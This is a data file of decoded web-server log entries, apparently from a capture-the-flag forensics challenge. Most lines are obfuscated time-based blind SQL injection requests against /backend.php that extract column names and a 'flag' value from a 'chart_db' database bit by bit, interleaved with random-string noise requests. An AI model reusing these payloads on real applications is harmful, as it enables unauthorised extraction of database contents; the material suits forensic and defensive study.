line_no	timestamp	decoded_request
212	01/Mar/2015:13:14:20 -0500	/backend.php?user=admin' AND IF(/*hnAkgsbmUlq*/SUBSTRING(REVERSE(/*15ZdqqW*/CONV(HEX(SUBSTRING(/*IhH03*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*60CWYE4gnQ8*/),2,1)),16,2))/*7cfx*/,2,1)=1,SLEEP(2),475988719) AND '12
213	01/Mar/2015:13:14:21 -0500	/backend.php?user=utiJYO64Z51qcVjKqMoCIaByAPRbo38Ky6vPYd3OL0IlQEUQegdIxHr31i1eKMQpuI8mA4hY1l
214	01/Mar/2015:13:14:20 -0500	/backend.php?user=admin' AND IF(/*nd*/SUBSTRING(REVERSE(/*THDHH*/CONV(HEX(SUBSTRING(/*u0iS14*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*EchFpn*/),2,1)),16,2))/*SxQl*/,3,1)=1,SLEEP(2),632452) AND '1254352
215	01/Mar/2015:13:14:23 -0500	/backend.php?user=gF8ehVqcOXIGtiHnCD52jpkE8hYYuvKffbUXhBl7l6752CpuUcEeocGg2Et
216	01/Mar/2015:13:14:24 -0500	/backend.php?user=tfTeiss3XNh96arZvHihgPOTXrTn01sOS8Q7OFu4IwnlDELeYlWSOAOxkOb8wIKp0
217	01/Mar/2015:13:14:22 -0500	/backend.php?user=admin' AND IF(/*RSRRnC*/SUBSTRING(REVERSE(/*EZzuQ*/CONV(HEX(SUBSTRING(/*70RJh1*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*cwIPsp*/),2,1)),16,2))/*GXaG*/,4,1)=1,SLEEP(2),687113) AND '1569
218	01/Mar/2015:13:14:24 -0500	/backend.php?user=admin' AND IF(/*FYbXEmRO*/SUBSTRING(REVERSE(/*1aXmBExEc*/CONV(HEX(SUBSTRING(/*OYMAWfz*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*GAJemb*/),2,1)),16,2))/*zijmV6Gt*/,5,1)=1,SLEEP(2),282161542) AND '3696
219	01/Mar/2015:13:14:26 -0500	/backend.php?user=LSy7NLBgQAHslTgSpH2ymkBE3
220	01/Mar/2015:13:14:24 -0500	/backend.php?user=admin' AND IF(/*Lp6*/SUBSTRING(REVERSE(/*JGeSt1*/CONV(HEX(SUBSTRING(/*wllaA8*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*8sB*/),2,1)),16,2))/*hj*/,6,1)=1,SLEEP(2),6973832) AND '53
221	01/Mar/2015:13:14:27 -0500	/backend.php?user=6wtUtg0HUOoBGUoYWcOrU
222	01/Mar/2015:13:14:28 -0500	/backend.php?user=9L8eqCwy3AL07gUpKVuhb8I0tZEQcWL0Rz7M67ZL7mccmxFKZJWTdG05EmBZOiDocsqWMWaeVaoh8LgJUUUMMFD6E9d9HjHTme
223	01/Mar/2015:13:14:26 -0500	/backend.php?user=admin' AND IF(/*4oAm0*/SUBSTRING(REVERSE(/*4WD9z0MSs*/CONV(HEX(SUBSTRING(/*2hr0*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*qTYwttx72*/),2,1)),16,2))/*TX9wW*/,7,1)=1,SLEEP(2),48682) AND '389536
224	01/Mar/2015:13:14:29 -0500	/backend.php?user=yZDhCg213osCpTE2uWYLy5gkr8D391
225	01/Mar/2015:13:14:30 -0500	/backend.php?user=sz72a0beZZ1oXcBWFc1E1ioEZJG519
226	01/Mar/2015:13:14:28 -0500	/backend.php?user=admin' AND IF(/*5h*/SUBSTRING(REVERSE(/*tL*/CONV(HEX(SUBSTRING(/*6v8T*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*7W26n0mC7E*/),3,1)),16,2))/*6gLSrhH*/,1,1)=1,SLEEP(2),189411562) AND '3684
227	01/Mar/2015:13:14:30 -0500	/backend.php?user=admin' AND IF(/*rghy0wEfj*/SUBSTRING(REVERSE(/*XylQ*/CONV(HEX(SUBSTRING(/*9C8XKoK*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*VxUO2J*/),3,1)),16,2))/*vC1n7Yy2if*/,2,1)=1,SLEEP(2),883391252) AND '2796851
228	01/Mar/2015:13:14:30 -0500	/backend.php?user=admin' AND IF(/*ocqVQf*/SUBSTRING(REVERSE(/*nAPH*/CONV(HEX(SUBSTRING(/*BP*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*NL5WK*/),3,1)),16,2))/*ONsz*/,3,1)=1,SLEEP(2),237996633) AND '363615
229	01/Mar/2015:13:14:30 -0500	/backend.php?user=admin' AND IF(/*JBIAKm*/SUBSTRING(REVERSE(/*HkE6pK*/CONV(HEX(SUBSTRING(/*up7OpW76*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*ucIf41RL*/),3,1)),16,2))/*cj*/,4,1)=1,SLEEP(2),43467266) AND '82956
230	01/Mar/2015:13:14:30 -0500	/backend.php?user=admin' AND IF(/*Jd*/SUBSTRING(REVERSE(/*byGSR*/CONV(HEX(SUBSTRING(/*cmtjQxfXl*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*2owiaJlb*/),3,1)),16,2))/*aA*/,5,1)=1,SLEEP(2),4694) AND '478819
231	01/Mar/2015:13:14:31 -0500	/backend.php?user=m3smTtEgNRbVVgRgFDIqejAadLW30O45iqkdVKiFWmg3W
232	01/Mar/2015:13:14:30 -0500	/backend.php?user=admin' AND IF(/*dck8uek6Hhm*/SUBSTRING(REVERSE(/*2mBkIAjxc*/CONV(HEX(SUBSTRING(/*p9*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*d7fGSAI*/),3,1)),16,2))/*D11V5NPpbEw*/,6,1)=1,SLEEP(2),568187252) AND '898722
233	01/Mar/2015:13:14:33 -0500	/backend.php?user=jFB2pFv36uej1p4wkosTgFdIgdvG92fkhDdQApoU6zFN2Am3
234	01/Mar/2015:13:14:34 -0500	/backend.php?user=qaUQ5BjlqVnhxdbx1DcJrF0tP51bvajcPCBQwmuhgY5kpc5IO1gK2q6yZaLfIwI2kkLGIGvQQiAPNQiYVnTEgASvDKDlKyKRuS
235	01/Mar/2015:13:14:32 -0500	/backend.php?user=admin' AND IF(/*Yj*/SUBSTRING(REVERSE(/*IoIw*/CONV(HEX(SUBSTRING(/*vHIiLi1k*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*11c6*/),3,1)),16,2))/*r4Q*/,7,1)=1,SLEEP(2),31143) AND '77
236	01/Mar/2015:13:14:35 -0500	/backend.php?user=VQ1F5bVhDznDhcbpvlzVrpE775FdbWFX831f6d5Z4D3578C7aKF7V7BadIy4mqbnirxRTSblgoyTtNHgqS0FCOWWPtnjUfUYF1
237	01/Mar/2015:13:14:34 -0500	/backend.php?user=admin' AND IF(/*kxJ9kaKYUqs*/SUBSTRING(REVERSE(/*2RA8zxueie*/CONV(HEX(SUBSTRING(/*837xdse*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*QFT*/),4,1)),16,2))/*0iV5Wj7xGR*/,1,1)=1,SLEEP(2),8414) AND '92734
238	01/Mar/2015:13:14:37 -0500	/backend.php?user=WVaOXCDKEDahmCpCgy01JkcjbU1ilwOD0vJqAtW8Uzw
239	01/Mar/2015:13:14:38 -0500	/backend.php?user=67JJoOHtMkzr5OdG8lXTBXH24fTYWG2hxa8HosZ1l0fQhWET8iwF8ot95P22wZOiFBBG96g
240	01/Mar/2015:13:14:36 -0500	/backend.php?user=admin' AND IF(/*yf*/SUBSTRING(REVERSE(/*Zxo*/CONV(HEX(SUBSTRING(/*BxkcWefq*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*bb*/),4,1)),16,2))/*bJ*/,2,1)=1,SLEEP(2),3871132) AND '616
241	01/Mar/2015:13:14:39 -0500	/backend.php?user=KRcyOSFV8U1WxlJJ15q7UpYWqmoYq9HdbxKgqWjNIoq977ctM0BHBaL8mfLKuXb0AoJakI7T0XGH5Jem
242	01/Mar/2015:13:14:39 -0500	/backend.php?user=admin' AND IF(/*K7*/SUBSTRING(REVERSE(/*vr3LJLxiS0q*/CONV(HEX(SUBSTRING(/*1VvOIgoq*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*okyU8IJ8J*/),4,1)),16,2))/*RfLA9A*/,3,1)=1,SLEEP(2),97483824) AND '9299331
243	01/Mar/2015:13:14:41 -0500	/backend.php?user=admin' AND IF(/*Juj*/SUBSTRING(REVERSE(/*uay*/CONV(HEX(SUBSTRING(/*DJJDl*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*Bs*/),4,1)),16,2))/*FlwLOez5M*/,4,1)=1,SLEEP(2),9699466) AND '526
244	01/Mar/2015:13:14:41 -0500	/backend.php?user=admin' AND IF(/*T0uefvTw*/SUBSTRING(REVERSE(/*spMzNYvDOxA*/CONV(HEX(SUBSTRING(/*YSw8EfP*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*3Z8xmS5ZV5e*/),4,1)),16,2))/*G3MvGFbp*/,5,1)=1,SLEEP(2),55738) AND '38556
245	01/Mar/2015:13:14:41 -0500	/backend.php?user=MSJELRMESVElz3gcsG82CU5Nlt88YG36xKnBB9bolmdTZw8EL3IpzvqQp9X8
246	01/Mar/2015:13:14:41 -0500	/backend.php?user=admin' AND IF(/*G394Nz*/SUBSTRING(REVERSE(/*UgLWu5d6*/CONV(HEX(SUBSTRING(/*ZPs5OkU8wc*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*PbB53dUT*/),4,1)),16,2))/*mbkKR*/,6,1)=1,SLEEP(2),16171861) AND '585636
247	01/Mar/2015:13:14:43 -0500	/backend.php?user=8E3F1wYHnhc3VWSXynnmKAjPz0Iwnlde92r5LXl8XNNKGnyRXNO6WLsEvagIgVTsQ08ibZDZCUj5dDALaOk7QzDs3ABgu3n5
248	01/Mar/2015:13:14:44 -0500	/backend.php?user=DXwmpIPTf8BQJfwdKA87f08WWNlHs
249	01/Mar/2015:13:14:43 -0500	/backend.php?user=admin' AND IF(/*SXDby4td*/SUBSTRING(REVERSE(/*UJF8DKMO68z*/CONV(HEX(SUBSTRING(/*y37aqi0B2*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*WOwHb*/),4,1)),16,2))/*wY5HvZNq4f*/,7,1)=1,SLEEP(2),15357177) AND '698239
250	01/Mar/2015:13:14:45 -0500	/backend.php?user=admin' AND IF(/*iC*/SUBSTRING(REVERSE(/*dzzYaxYMNEJ*/CONV(HEX(SUBSTRING(/*bgv9*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*EGi*/),5,1)),16,2))/*wpDrzIP*/,1,1)=1,SLEEP(2),777525694) AND '6335129
251	01/Mar/2015:13:14:45 -0500	/backend.php?user=admin' AND IF(/*5Q*/SUBSTRING(REVERSE(/*tawZ930k*/CONV(HEX(SUBSTRING(/*VU1iBt7f7*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*yFbiAjt*/),5,1)),16,2))/*6d*/,2,1)=1,SLEEP(2),26275) AND '6478486
252	01/Mar/2015:13:14:45 -0500	/backend.php?user=admin' AND IF(/*VPsqMiYJ*/SUBSTRING(REVERSE(/*1cof*/CONV(HEX(SUBSTRING(/*fidfLo8h0K0*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*m20hYbj*/),5,1)),16,2))/*DwKr*/,3,1)=1,SLEEP(2),2919882) AND '47
253	01/Mar/2015:13:14:45 -0500	/backend.php?user=admin' AND IF(/*MgajRq5*/SUBSTRING(REVERSE(/*n7L41Zq*/CONV(HEX(SUBSTRING(/*IQr*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*gMiSSWq27*/),5,1)),16,2))/*RliMhBK*/,4,1)=1,SLEEP(2),66898344) AND '5299
254	01/Mar/2015:13:14:45 -0500	/backend.php?user=admin' AND IF(/*gIxbtmXUX*/SUBSTRING(REVERSE(/*7lPmcFF*/CONV(HEX(SUBSTRING(/*7eYB*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*kcOTmr3YaO*/),5,1)),16,2))/*LvJ85EE*/,5,1)=1,SLEEP(2),76274768) AND '526
255	01/Mar/2015:13:14:45 -0500	/backend.php?user=admin' AND IF(/*bGnu3*/SUBSTRING(REVERSE(/*rLgL36*/CONV(HEX(SUBSTRING(/*dFVNT8*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*rhfR*/),5,1)),16,2))/*JGq49IbDJ5d*/,6,1)=1,SLEEP(2),16469663) AND '365
256	01/Mar/2015:13:14:45 -0500	/backend.php?user=admin' AND IF(/*UExo3n*/SUBSTRING(REVERSE(/*ITlNczHyAa2*/CONV(HEX(SUBSTRING(/*RLghShs8efb*/(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE TABLE_SCHEMA = 0x63686172745f6462 AND TABLE_NAME = 0x666c6167/*kepLtYadf*/),5,1)),16,2))/*R4cryhPfFVd*/,7,1)=1,SLEEP(2),527362899) AND '1263
257	01/Mar/2015:13:14:46 -0500	/backend.php?user=EEhfLyGU67b41e4v
258	01/Mar/2015:13:14:47 -0500	/backend.php?user=I0C4GIfYRPQ5n
259	01/Mar/2015:13:14:48 -0500	/backend.php?user=A4TAbbCWDaufviJjRpznKzFMMTfBA7zCVv
260	01/Mar/2015:13:14:49 -0500	/backend.php?user=87Z49ENwRBgZmw2GULqneK3sBHYX1gchvLSFtaAxWRFtNA5eatIhmG32tC4wQEvYXCKg4CdB1dI5jyYe
261	01/Mar/2015:13:14:51 -0500	/backend.php?user=FOQNf5qrIC68aLNnEeSpgW5EI9FSwGo
262	01/Mar/2015:13:14:52 -0500	/backend.php?user=kmhYkmzVxtXT6yBLFZqBDrt2iooR7Pw1iLUJWyYX7p7Z3b6WftqB5K4Uy
263	01/Mar/2015:13:14:53 -0500	/backend.php?user=8I63cgrWXt6hGkSeMQ2EdG7FRDN9UvK0tHuizq341CcPZw8j
264	01/Mar/2015:13:14:55 -0500	/backend.php?user=ZuyeftfYAucHfXU9r1GoCDpUFdi1aE1JFKBN8r9XcrMcEObRhie89MlAWjQ0C3SDzm46EHOXhhoByhbawdi0BhyslyEri
265	01/Mar/2015:13:14:56 -0500	/backend.php?user=jF6NFqTccpdhhgkYlapsLBfWngwRU9fG7W4I3ugMMoI2J
266	01/Mar/2015:13:14:57 -0500	/backend.php?user=75tL9KitHu4RyqK6C
267	01/Mar/2015:13:14:58 -0500	/backend.php?user=eGN1L3WXghrRw8pgsg0HgrMUAcp04qnNPshG5QorzMOy7xHe3MczyGuRbX3frmbLLLB6sTkl1iJjXn6skxPKcMS82x
268	01/Mar/2015:13:14:59 -0500	/backend.php?user=N0AzbfqWeLyc1hzf6tAKDKZ8Ys9VJ54VXsnPJbWvPTnqAe0EmXh7KaSd2gaYEMnTnAUmq7z41xEDy4pyb7ILxV
269	01/Mar/2015:13:15:00 -0500	/backend.php?user=kktiHW5iLnkULzdZ97x7xoYz05YhmfW
270	01/Mar/2015:13:15:02 -0500	/backend.php?user=k8orlLJR0VLGpi5eS9f8fEhRk2nnijhWO1I
271	01/Mar/2015:13:15:03 -0500	/backend.php?user=admin
272	01/Mar/2015:13:15:03 -0500	/backend.php?user=admin' AND IF(/*n4Yqaih*/SUBSTRING(REVERSE(/*QE8QT*/CONV(HEX(SUBSTRING(/*y68tFD*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*WQITwizg*/),1,1)),16,2))/*yT4Hl*/,1,1)=1,SLEEP(2),3724) AND '16173
273	01/Mar/2015:13:15:04 -0500	/backend.php?user=lK6ZQiVZfKfYw74mMbFammeZAkzcxjYKkkVPRwZ7u
274	01/Mar/2015:13:15:03 -0500	/backend.php?user=admin' AND IF(/*RKjm*/SUBSTRING(REVERSE(/*aFtLgy58vT*/CONV(HEX(SUBSTRING(/*R1R15*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*6OYHaOU*/),1,1)),16,2))/*o596H4yoB*/,2,1)=1,SLEEP(2),357511679) AND '1347
275	01/Mar/2015:13:15:06 -0500	/backend.php?user=PpIZfRQnYCeghYgekO3BUM334o832
276	01/Mar/2015:13:15:05 -0500	/backend.php?user=admin' AND IF(/*8Ba*/SUBSTRING(REVERSE(/*yu7RDNO*/CONV(HEX(SUBSTRING(/*kt*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*nYmiIuE4LD*/),1,1)),16,2))/*ptqGd*/,3,1)=1,SLEEP(2),868111894) AND '272158
277	01/Mar/2015:13:15:07 -0500	/backend.php?user=admin' AND IF(/*W7Pfbxn*/SUBSTRING(REVERSE(/*9bx23*/CONV(HEX(SUBSTRING(/*TM4fTNJ*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*FQ*/),1,1)),16,2))/*bfj7i*/,4,1)=1,SLEEP(2),5557891) AND '5286913
278	01/Mar/2015:13:15:07 -0500	/backend.php?user=admin' AND IF(/*1dJ*/SUBSTRING(REVERSE(/*2dR4r6j*/CONV(HEX(SUBSTRING(/*babJmIrlE*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*6ykrwXrMxhR*/),1,1)),16,2))/*jbdq7Px*/,5,1)=1,SLEEP(2),5891) AND '6689
279	01/Mar/2015:13:15:07 -0500	/backend.php?user=admin' AND IF(/*vd4MblG2Ezt*/SUBSTRING(REVERSE(/*uYdXypH*/CONV(HEX(SUBSTRING(/*lCF7*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*mSDhKKZ*/),1,1)),16,2))/*gFaFAXANagA*/,6,1)=1,SLEEP(2),571663351) AND '72684
280	01/Mar/2015:13:15:08 -0500	/backend.php?user=Uq7oRzXm2ErzTV2NSzTRSJeRMgoOAwxciiUBBM7x6MIi9PFSzs8B3IrwXCnCW2KDMqOpqCHq9iHIu6
281	01/Mar/2015:13:15:09 -0500	/backend.php?user=5Rmg8JjRWwsWjyCauGrDvKyA7Gh588Q715d2cBc
282	01/Mar/2015:13:15:07 -0500	/backend.php?user=admin' AND IF(/*NSH8*/SUBSTRING(REVERSE(/*4RveT0*/CONV(HEX(SUBSTRING(/*JtFF0JM*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*v2IMXIVokWg*/),1,1)),16,2))/*KaRS*/,7,1)=1,SLEEP(2),425794) AND '699928
283	01/Mar/2015:13:15:09 -0500	/backend.php?user=admin' AND IF(/*Q4w*/SUBSTRING(REVERSE(/*sxRuwwJI5*/CONV(HEX(SUBSTRING(/*pHY*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*yDZLIfHZJ*/),2,1)),16,2))/*UmmVxx*/,1,1)=1,SLEEP(2),643631) AND '664
284	01/Mar/2015:13:15:09 -0500	/backend.php?user=admin' AND IF(/*GusOl4X*/SUBSTRING(REVERSE(/*VnHZoBPrJZn*/CONV(HEX(SUBSTRING(/*suqXQK*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*x4LG*/),2,1)),16,2))/*qA*/,2,1)=1,SLEEP(2),68413) AND '33274
285	01/Mar/2015:13:15:11 -0500	/backend.php?user=gQGqjEFsIvDI4uYrOmEOwDiDRn5BerYnz5xFEca0s4NljeR14j2NHLsky5rARcnXeacUQAgjd5QkJ6zPqKk4Hw
286	01/Mar/2015:13:15:09 -0500	/backend.php?user=admin' AND IF(/*FCHAH4d6UT*/SUBSTRING(REVERSE(/*4xX*/CONV(HEX(SUBSTRING(/*Hr2a*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*rdK6JyMYfD*/),2,1)),16,2))/*7aidKmdOVQf*/,3,1)=1,SLEEP(2),4661235) AND '4997658
287	01/Mar/2015:13:15:13 -0500	/backend.php?user=4OwFqUQqUd3o
288	01/Mar/2015:13:15:11 -0500	/backend.php?user=admin' AND IF(/*Jfbq7A7mZY*/SUBSTRING(REVERSE(/*KXC3n69hR*/CONV(HEX(SUBSTRING(/*S02Mv*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*PB6wr*/),2,1)),16,2))/*IrRcKnt*/,4,1)=1,SLEEP(2),6261) AND '78688
289	01/Mar/2015:13:15:13 -0500	/backend.php?user=admin' AND IF(/*HyXsRrT7Bm*/SUBSTRING(REVERSE(/*kkC3g*/CONV(HEX(SUBSTRING(/*mZP6X2g*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*3c*/),2,1)),16,2))/*xa*/,5,1)=1,SLEEP(2),3498) AND '785
290	01/Mar/2015:13:15:13 -0500	/backend.php?user=admin' AND IF(/*gB7LnaisQB*/SUBSTRING(REVERSE(/*MK*/CONV(HEX(SUBSTRING(/*BaOjp*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*C0Z*/),2,1)),16,2))/*qdVNbk8E*/,6,1)=1,SLEEP(2),8921329) AND '83
291	01/Mar/2015:13:15:15 -0500	/backend.php?user=0rJ69lFmz2EPoZFjB55Zym
292	01/Mar/2015:13:15:13 -0500	/backend.php?user=admin' AND IF(/*md6MUWliHoG*/SUBSTRING(REVERSE(/*NSeWz6*/CONV(HEX(SUBSTRING(/*4DDuCaiWN*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*bjGji4Nm5Ll*/),2,1)),16,2))/*wmxtafdlC*/,7,1)=1,SLEEP(2),976624) AND '3191
293	01/Mar/2015:13:15:17 -0500	/backend.php?user=ssg3q9yEoBm
294	01/Mar/2015:13:15:15 -0500	/backend.php?user=admin' AND IF(/*Ii*/SUBSTRING(REVERSE(/*EmXF*/CONV(HEX(SUBSTRING(/*E2a9*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*Ojuy*/),3,1)),16,2))/*y7hjnA1PE*/,1,1)=1,SLEEP(2),72977174) AND '318
295	01/Mar/2015:13:15:17 -0500	/backend.php?user=admin' AND IF(/*qGw7Wz0o*/SUBSTRING(REVERSE(/*zhn57T*/CONV(HEX(SUBSTRING(/*SmpHPjMBB*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*fqd7V*/),3,1)),16,2))/*0UQBWF*/,2,1)=1,SLEEP(2),189961318) AND '585445
296	01/Mar/2015:13:15:17 -0500	/backend.php?user=admin' AND IF(/*QC15dHQ*/SUBSTRING(REVERSE(/*0VMa1TrT5*/CONV(HEX(SUBSTRING(/*yZ*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*LLrd387*/),3,1)),16,2))/*8nFjyFNDTO*/,3,1)=1,SLEEP(2),32351) AND '9582
297	01/Mar/2015:13:15:17 -0500	/backend.php?user=admin' AND IF(/*LKAFy3Lr*/SUBSTRING(REVERSE(/*0VtjKCppWFX*/CONV(HEX(SUBSTRING(/*hc2rzDr*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*UPTBkk9*/),3,1)),16,2))/*vWJmH*/,4,1)=1,SLEEP(2),625349) AND '8469
298	01/Mar/2015:13:15:17 -0500	/backend.php?user=admin' AND IF(/*x7AYaLcjh*/SUBSTRING(REVERSE(/*iL4H*/CONV(HEX(SUBSTRING(/*UoHmQ8ZcDq*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*gQ83g7Deu*/),3,1)),16,2))/*Bw8*/,5,1)=1,SLEEP(2),382632) AND '6222
299	01/Mar/2015:13:15:17 -0500	/backend.php?user=admin' AND IF(/*o6mgAE7yP4*/SUBSTRING(REVERSE(/*c61X*/CONV(HEX(SUBSTRING(/*zWG5x*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*B5R50PIV1*/),3,1)),16,2))/*xpectQ*/,6,1)=1,SLEEP(2),379196) AND '88
300	01/Mar/2015:13:15:18 -0500	/backend.php?user=sbn9hlGJ9Bz
301	01/Mar/2015:13:15:17 -0500	/backend.php?user=admin' AND IF(/*uL9mOitgcy*/SUBSTRING(REVERSE(/*kOpNZvUF*/CONV(HEX(SUBSTRING(/*ZS1mkZL*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*zO9xV9*/),3,1)),16,2))/*36RdA5dh*/,7,1)=1,SLEEP(2),551333852) AND '26884
302	01/Mar/2015:13:15:20 -0500	/backend.php?user=74zktqi6kAs8apTALn5SOhc0WpwGsCiQ75k2ppnAeBjKypi0LAw8tzXLy1JtORgOfE8q
303	01/Mar/2015:13:15:19 -0500	/backend.php?user=admin' AND IF(/*J5UxbkD*/SUBSTRING(REVERSE(/*zx6hrf*/CONV(HEX(SUBSTRING(/*9RYiaGIQ797*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*5J64qm*/),4,1)),16,2))/*1Bd*/,1,1)=1,SLEEP(2),497938851) AND '7919797
304	01/Mar/2015:13:15:22 -0500	/backend.php?user=Yl1fgRfrHgyarquvZI38HASjLQLDZj
305	01/Mar/2015:13:15:21 -0500	/backend.php?user=admin' AND IF(/*okj1*/SUBSTRING(REVERSE(/*a61OI6*/CONV(HEX(SUBSTRING(/*06cfBt*/(SELECT GROUP_CONCAT(CONCAT(flag)) FROM chart_db.flag/*YbrjI*/),4,1)),16,2))/*Yc66Txc*/,2,1)=1,SLEEP(2),39232945) AND '51
